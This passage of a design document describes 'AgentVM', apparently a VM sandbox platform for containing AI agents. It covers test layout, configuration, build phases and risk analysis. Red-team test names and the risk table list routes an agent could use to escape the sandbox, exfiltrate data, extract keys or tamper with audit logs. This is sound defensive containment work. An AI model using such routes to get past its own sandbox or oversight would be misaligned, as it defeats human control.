│   │   ├── mock_cgroup.py
│   │   └── mock_iptables.py
│   ├── fixtures/
│   │   ├── base-images/
│   │   ├── cloud-init/
│   │   └── proxy-keys/
│   ├── helpers/
│   │   ├── ssh.py
│   │   ├── network.py
│   │   ├── vm.py
│   │   └── attack.py
│   ├── unit/
│   │   ├── test_session.py
│   │   ├── test_vm_manager.py
│   │   ├── test_xml_builder.py
│   │   ├── test_network_policy.py
│   │   ├── test_storage.py
│   │   ├── test_auth_proxy.py
│   │   ├── test_cloud_init.py
│   │   ├── test_capacity.py
│   │   ├── test_metadata_store.py
│   │   ├── test_audit.py
│   │   ├── test_orchestrator_adapter.py
│   │   ├── test_image_metadata.py
│   │   └── test_cli.py
│   ├── integration/
│   │   ├── test_vm_lifecycle.py
│   │   ├── test_nested_virt.py
│   │   ├── test_isolation.py
│   │   ├── test_resource_limits.py
│   │   ├── test_shared_folder.py
│   │   ├── test_auth_proxy.py
│   │   ├── test_network_modes.py
│   │   ├── test_network_runtime.py
│   │   ├── test_proxy_security.py
│   │   ├── test_shared_folder_escape.py
│   │   ├── test_session_api.py
│   │   ├── test_concurrent_vms.py
│   │   ├── test_vm_crash_recovery.py
│   │   └── test_image_management.py
│   ├── e2e/
│   │   ├── test_full_session.py
│   │   ├── test_agent_workflow.py
│   │   ├── test_orchestrator_routing.py
│   │   ├── test_multi_session.py
│   │   ├── test_shared_folder_workflow.py
│   │   ├── test_network_workflow.py
│   │   ├── test_proxy_workflow.py
│   │   ├── test_crash_recovery.py
│   │   └── test_host_capacity.py
│   └── redteam/
│       ├── test_escape_shared_folder.py
│       ├── test_escape_network.py
│       ├── test_escape_cgroup.py
│       ├── test_escape_proxy.py
│       ├── test_escape_virtiofs.py
│       ├── test_escape_qemu_device.py
│       ├── test_escape_svirt.py
│       ├── test_escape_cloud_init.py
│       ├── test_escape_nested_virt.py
│       ├── test_reconnaissance.py
│       ├── test_denial_of_service.py
│       ├── test_data_exfiltration.py
│       └── test_audit_tampering.py
│
└── scripts/
    ├── setup-host.sh            # One-time host setup
    ├── build-image.sh           # Build base VM image
    ├── build-proxy.sh           # Build auth proxy binary
    └── dev-environment.sh       # Local dev setup
```

---

## 14. Configuration File

```yaml
# /etc/agentvm/agentvm.yaml

host:
  name: "agentvm-host-01"
  max_vms: 20

storage:
  base_dir: "/var/lib/agentvm"
  base_images_dir: "/var/lib/agentvm/base"
  vm_data_dir: "/var/lib/agentvm/vms"
  shared_dir: "/var/lib/agentvm/shared"
  proxy_dir: "/var/lib/agentvm/proxy"
  default_image: "ubuntu-24.04-amd64"

network:
  bridge_name: "agentvm-br0"
  bridge_subnet: "10.0.0.0/24"
  bridge_gateway: "10.0.0.1"
  dhcp_range_start: "10.0.0.100"
  dhcp_range_end: "10.0.0.254"
  default_bandwidth_mbps: 100
  wan_interface: "eth0"           # for NAT masquerade
  default_policy: "strict"        # strict | restricted | permissive

resources:
  default_cpu_cores: 2
  default_memory_mb: 4096
  default_disk_gb: 20
  max_cpu_cores: 16
  max_memory_mb: 65536
  max_disk_gb: 200
  reserved_cores: [0, 1]          # never allocate to VMs
  reserved_memory_mb: 4096        # reserved for host OS

auth_proxy:
  enabled: true
  port_range_start: 23760
  binary_path: "/usr/local/bin/agentvm-auth-proxy"
  default_user: "agentvm-proxy"

shared_folder:
  enabled: true
  driver: "virtiofs"              # virtiofs | 9p
  guest_mount_point: "/mnt/shared"
  max_size_gb: 10                 # per-session limit
  allow_symlinks: false           # never follow symlinks out of shared dir

api:
  host: "127.0.0.1"               # bind to localhost only by default
  port: 9090
  api_keys:
    - key: "change-me-in-production"
      name: "admin"
      permissions: ["create", "destroy", "list", "admin"]

security:
  selinux_enforcing: true
  enable_audit_log: true
  vm_max_lifetime_hours: 24       # auto-destroy after 24h (0 = no limit)
  ssh_key_required: true

observability:
  metrics_enabled: true
  metrics_port: 9091              # Prometheus exporter port
  log_level: "INFO"
  console_log_dir: "/var/lib/agentvm/logs"
  audit_log_path: "/var/lib/agentvm/logs/audit.log"
```

---

## 15. Implementation Phases

### Phase 1: Foundation (Week 1-2)

```
Goal: Can create and destroy a single KVM VM via Python code

Tasks:
  [ ] Host prerequisite checks (KVM, libvirt, nested virt)
  [ ] libvirt connection management
  [ ] VM XML builder (from template above)
  [ ] Basic VM create/destroy via libvirt Python bindings
  [ ] qcow2 overlay disk creation
  [ ] Cloud-init ISO generation (SSH key injection)
  [ ] SQLite metadata store (sessions + vms tables)
  [ ] Basic unit tests

Deliverable: Python script that creates a VM, SSHs in, then destroys it
```

### Phase 2: Session Model + Auth Proxy (Week 2-3)

```
Goal: Session abstraction with auth proxy for API key isolation

Tasks:
  [ ] WorkloadSession dataclass and state machine
  [ ] Session manager wrapping VM manager
  [ ] Auth proxy Go binary (static, no shell, no libc)
  [ ] Proxy config generation and lifecycle management
  [ ] Cloud-init injection of proxy BASE_URL and dummy key
  [ ] Shared folder directory creation and virtiofs mount
  [ ] Unit tests for session lifecycle and proxy config
  [ ] Integration test: proxy intercepts HTTP and injects real key

Deliverable: `agentvm session create` creates VM with proxy + shared folder
```

### Phase 3: API + CLI (Week 3-4)

```
Goal: REST API for session lifecycle, runtime network control, full CLI

Tasks:
  [ ] FastAPI application structure
  [ ] POST/GET/DELETE /sessions endpoints
  [ ] Network policy endpoints (allow/block/reset)
  [ ] Proxy and shared folder status endpoints
  [ ] Capabilities endpoint (for orchestrator)
  [ ] Pydantic request/response schemas
  [ ] API key authentication
  [ ] Click CLI: session, network, proxy, shared, ssh, logs, audit
  [ ] Error handling and validation
  [ ] OpenAPI docs (auto-generated by FastAPI)

Deliverable: Full CLI with session management and runtime network control
```

### Phase 4: Network Isolation + Policy (Week 4-5)

```
Goal: Three network modes with runtime domain-based control

Tasks:
  [ ] Bridge creation and management
  [ ] dnsmasq DHCP per bridge with domain filtering
  [ ] iptables rule automation (VM→VM block, VM→host block, private CIDR block)
  [ ] ipset creation for allowlist (strict mode) and blocklist (restricted mode)
  [ ] Runtime allow_domain/block_domain/reset via ipset mutation
  [ ] Traffic control (tc) rate limiting per VM
  [ ] Network cleanup on session destroy
  [ ] Integration tests: verify all three modes
  [ ] Integration test: runtime rule changes take effect

Deliverable: Three network modes working, runtime control via CLI
```

### Phase 5: Resource Enforcement + Shared Folder (Week 5-6)

```
Goal: Guaranteed resource limits, shared folder with escape prevention

Tasks:
  [ ] CPU pinning logic (topology-aware allocation)
  [ ] cgroups v2 setup for each VM's QEMU process
  [ ] Memory hard limits
  [ ] Disk I/O throttling
  [ ] Capacity checking before session creation
  [ ] Shared folder virtiofs configuration
  [ ] Shared folder escape prevention tests
  [ ] Integration tests: verify limits hold under stress

Deliverable: VM running stress-ng cannot exceed allocated resources; shared folder is secure
```

### Phase 6: Observability + Security (Week 6-7)

```
Goal: Full audit trail, unified event format, red-team testing

Tasks:
  [ ] Prometheus metrics exporter
  [ ] Per-session metrics collection (cgroups + libvirt + proxy)
  [ ] Unified audit event format
  [ ] Console log capture
  [ ] Host hardening script (sysctl, SELinux, firewall, service lockdown)
  [ ] Health checks (host + per-VM + proxy + shared folder)
  [ ] Red-team test suite (all 13 attack categories)
  [ ] Security tests: attempt VM escape, verify containment

Deliverable: Grafana dashboard + all red-team tests passing
```

### Phase 7: Orchestrator Adapter + Production (Week 7-8)

```
Goal: IsolationBackend protocol implementation, production readiness

Tasks:
  [ ] IsolationBackend protocol implementation
  [ ] BackendCapabilities reporting
  [ ] Image metadata with capability hints
  [ ] Error recovery (VM crash cleanup, orphaned resource detection)
  [ ] Base image management (upload, list, delete with metadata)
  [ ] Configuration file support (YAML)
  [ ] systemd service file for daemon
  [ ] Comprehensive documentation
  [ ] Load testing (many concurrent sessions)
  [ ] Graceful shutdown (drain sessions on daemon stop)
  [ ] Session TTL support (auto-destroy after N hours)
  [ ] E2E tests with mock orchestrator

Deliverable: `systemctl start agentvm` runs the full platform; orchestrator can route workloads
```

---

## 16. Risk Analysis

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| QEMU VM escape via device vulnerability | Low | Critical | Minimal device model (virtio only), no USB/audio/video, keep QEMU updated |
| Kernel exploit allowing host access | Low | Critical | Host kernel hardening (sysctl), SELinux enforcing, regular patching |
| Resource exhaustion (too many VMs) | Medium | High | Capacity checking before creation, resource reservation, alerts at 80% |
| Network isolation misconfiguration | Medium | High | Automated iptables management (no manual rules), integration tests |
| Orphaned resources after crash | Medium | Medium | Periodic cleanup job, resource tracking in SQLite |
| Nested virt performance degradation | High | Low | Document overhead expectations, let agent tune within VM |
| API authentication bypass | Low | Critical | Token auth, bind to localhost by default, optional TLS |
| Auth proxy compromise (key extraction) | Low | Critical | Static binary, no shell, no libc, no writable fs, cap-drop=ALL |
| Shared folder escape (symlink/mount) | Medium | High | virtiofs with no-symlink-follow, AppArmor on guest, red-team tests |
| Proxy key leakage via /proc or coredump | Low | Critical | Proxy runs on host (not in VM), coredump disabled, separate UID |
| VM-to-VM side channel (timing, cache) | Low | Medium | CPU pinning to dedicated cores, separate NUMA nodes where possible |
| Orchestrator routing error (wrong backend) | Medium | Medium | Capability validation before routing, clear error messages |
| Audit log tampering by compromised VM | Low | High | Audit log written on host, not in VM; immutable append-only format |
| dnsmasq vulnerability enabling DNS manipulation | Low | High | Rate-limited DNS, minimal dnsmasq config, regular updates |
| Cloud-init injection of malicious config | Medium | High | Generated by host daemon only, VM cannot modify, checksums verified |

---

## 17. Technology Stack Summary

| Component | Technology | Rationale |
|---|---|---|
| Language | Python 3.11+ | Available in environment, libvirt bindings, async support |
| Hypervisor | KVM/QEMU via libvirt | Only option with production-grade nested virt support |
| API Framework | FastAPI + Uvicorn | Async, auto OpenAPI docs, Pydantic validation |
| CLI | Click | Standard Python CLI framework |
| Metadata Store | SQLite (aiosqlite) | Simple, zero-config, sufficient for single-host |
| Metrics | Prometheus client + custom exporter | Industry standard, integrates with Grafana |
| Logging | structlog | Structured JSON logging |
| Networking | libvirt NAT + iptables + ipset + tc | Battle-tested, fully automated |
| Storage | qcow2 overlays on base images | Fast provisioning (COW), efficient disk usage |
| VM Config | cloud-init | Standard for VM initialization |
| Shared Folders | virtiofs (QEMU ≥6.0) or 9p | Kernel-level passthrough with access control |
| Auth Proxy | Go static binary | Minimal attack surface, no runtime dependencies |
| Packaging | pip/setuptools (Python), Makefile (Go proxy) | Standard tooling |

---

## 18. Key Design Decisions Summary

| Decision | Choice | Why |
|---|---|---|
| Hypervisor | KVM/QEMU + libvirt | Nested virt support, mature, battle-tested |
| VM type | Full VMs (not containers) | Hardware isolation, adversarial agent assumption |
| API style | REST (JSON) | Simple, language-agnostic, easy to integrate |
| Storage backend | qcow2 COW overlays | Fast create/destroy, space-efficient |
| Metadata | SQLite | Simple, embedded, sufficient for single-host |
| Network | NAT bridge + iptables + ipset | Proven isolation, automated management, runtime control |
| Security model | Defense-in-depth (7 layers) | No single point of failure |
| Resource control | cgroups v2 | Kernel-enforced, per-process granularity |
| Secret management | Host-side auth proxy | Real keys never enter VM boundary |
| Shared folders | virtiofs with AppArmor | Host↔VM channel with escape prevention |
| Session abstraction | Separate from VM lifecycle | Enables orchestrator compatibility with clampdown |
| Network modes | strict/restricted/permissive | Feature parity with clampdown's two-tier model |
| Orchestrator interface | IsolationBackend protocol | Uniform routing across clampdown + AgentVMs |
| Testing | Unit + integration + E2E + red-team | Security-critical infrastructure needs exhaustive validation |
| Auth proxy language | Go (static binary) | Minimal attack surface, no shell, no libc |
| Audit format | Unified across backends | Orchestrator needs single audit stream |

This design prioritizes **host security over agent convenience** while providing the orchestrator with a uniform interface to route workloads between AgentVMs (for VM-requiring workloads) and clampdown (for lightweight container workloads).